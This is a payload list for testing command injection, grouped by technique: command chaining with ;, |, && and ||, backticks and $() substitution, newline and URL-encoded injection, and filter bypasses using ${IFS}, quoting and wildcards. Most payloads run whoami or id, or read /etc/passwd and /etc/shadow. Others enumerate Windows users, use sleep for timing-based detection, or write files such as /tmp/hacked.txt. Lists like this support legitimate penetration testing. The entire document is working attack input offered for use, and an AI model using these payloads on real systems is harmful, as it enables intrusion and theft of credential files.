# Command Injection Payloads
# Use these payloads to test command injection vulnerabilities
# Target: Ping utilities, system commands, any user input executed as shell commands

# Basic Command Chaining - Linux/Unix
; whoami
; id
; cat /etc/passwd
; ls -la
; pwd
; uname -a

# Basic Command Chaining - Windows
; whoami
; dir
; type C:\Windows\win.ini
; ipconfig
; net user
; systeminfo

# Pipe Operator - Linux/Unix
| whoami
| id
| cat /etc/passwd
| ls -la
| ps aux

# Pipe Operator - Windows
| whoami
| dir
| type C:\Windows\win.ini
| ipconfig
| net user

# AND Operator - Linux/Unix
&& whoami
&& id
&& cat /etc/passwd
&& ls -la

# AND Operator - Windows
&& whoami
&& dir
&& type C:\Windows\win.ini
&& ipconfig

# OR Operator - Linux/Unix
|| whoami
|| id
|| cat /etc/passwd

# OR Operator - Windows
|| whoami
|| dir
|| type C:\Windows\win.ini

# Background Execution - Linux/Unix
& whoami
& id
& cat /etc/passwd &

# Backtick Execution - Linux/Unix
`whoami`
`id`
`cat /etc/passwd`
`ls -la`

# Command Substitution - Linux/Unix
$(whoami)
$(id)
$(cat /etc/passwd)
$(ls -la)

# Newline Injection
%0a whoami
%0a id
%0a cat /etc/passwd

# Combined with Valid Command - Linux
127.0.0.1; whoami
8.8.8.8; cat /etc/passwd
localhost; id
127.0.0.1 && ls -la
8.8.8.8 | cat /etc/shadow

# Combined with Valid Command - Windows
127.0.0.1; whoami
8.8.8.8; dir
localhost; ipconfig
127.0.0.1 && dir
8.8.8.8 | type C:\Windows\win.ini

# URL Encoded
%3B%20whoami
%26%26%20whoami
%7C%20whoami
%0a%20whoami

# Double Encoded
%253B%2520whoami
%2526%2526%2520whoami

# Space Bypass
;whoami
;cat</etc/passwd
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd

# Filter Bypass - Quotes
;w'h'o'a'm'i
;w"h"o"a"m"i

# Filter Bypass - Wildcards
;/bin/cat /etc/pass??
;/bin/cat /etc/pass*

# Filter Bypass - Environment Variables
;$USER
;echo $PATH
;echo $HOME

# Time-Based Detection
; sleep 5
; ping -c 5 127.0.0.1
&& sleep 5
| sleep 5
$(sleep 5)
`sleep 5`

# Windows Time-Based
; ping -n 5 127.0.0.1
&& ping -n 5 127.0.0.1
| ping -n 5 127.0.0.1

; echo "hacked" > /tmp/hacked.txt
; cat /etc/passwd > /tmp/passwd.txt
; cp /etc/passwd /tmp/passwd.bak

# File Operations - Windows
; echo hacked > C:\temp\hacked.txt
